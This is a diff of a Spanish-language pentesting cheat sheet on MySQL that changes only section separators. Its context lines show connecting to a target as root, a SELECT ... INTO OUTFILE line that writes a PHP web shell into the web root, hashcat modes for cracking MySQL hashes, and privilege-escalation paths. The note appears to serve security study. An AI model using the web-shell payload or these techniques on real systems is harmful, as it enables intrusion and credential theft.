@@ -17,7 +17,7 @@ linked:
 > [!info]
 > RDBMS open-source. Puerto default `3306`. Targets: dump de DBs, RCE via `INTO OUTFILE` / UDF, credential cracking de hashes.
 
-***
+---
 
 ## Conexión
 
@@ -32,7 +32,7 @@ mysql -h <target> -u root -p'password'
 mysql -h <target> -u root -e 'SHOW DATABASES;'
 ```
 
-***
+---
 
 ## Comandos útiles intra-sesión
 
@@ -55,7 +55,7 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 SELECT @@version, current_user(), @@datadir, @@secure_file_priv;
 ```
 
-***
+---
 
 ## Hashes MySQL
 
@@ -63,7 +63,7 @@ SELECT @@version, current_user(), @@datadir, @@secure_file_priv;
 - 4.1+: SHA1(SHA1(password)) → `*` + 40 hex
 - Cracking: hashcat `-m 300` o `-m 200` (4.1 old)
 
-***
+---
 
 ## Privesc paths
 
@@ -74,7 +74,7 @@ SELECT @@version, current_user(), @@datadir, @@secure_file_priv;
 | **mysqldump leak** | Credentials en `.mysql_history` | Cred reuse |
 | **mysql con `--defaults-file`** | Auth via config file | Recurso para PrivEsc en hosts |
 
-***
+---
 
 ## Notas Relacionadas
 
